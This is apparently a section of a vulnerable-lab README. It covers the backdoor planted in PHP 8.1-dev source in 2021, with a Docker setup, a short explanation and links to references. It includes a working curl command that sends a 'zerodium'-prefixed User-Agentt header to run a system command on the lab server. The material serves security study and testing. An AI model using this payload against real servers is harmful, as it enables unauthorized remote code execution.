# 4. PHP 8.1-DEV BACKDOOR
## Subtitle / what it does
PHP 8.1-dev has been backdoored. A malicious "User-agentt" header can be sent along with the request. Read more: https://arstechnica.com/gadgets/2021/03/hackers-backdoor-php-source-code-after-breaching-internal-git-server/

### Run in docker:
```
docker-compose up -d
curl -H "User-Agentt: zerodiumsystem('whoami');" http://localhost:8080
```
![image](https://user-images.githubusercontent.com/31791455/140391265-d9cc3cc8-9c61-47e3-9a54-eece30c0b779.png)


### Explanation
The backdoor looks for existence of malformed user-agent header. If it contains string "zerodium", then anything that comes after it will be executed.

### References and recommended reading
https://www.exploit-db.com/exploits/49933
https://github.com/flast101/php-8.1.0-dev-backdoor-rce

### Credits:
https://github.com/vulhub/vulhub/tree/4d17ab2d4df39eefad5c498c5aa60b036a05494d/php/8.1-backdoor
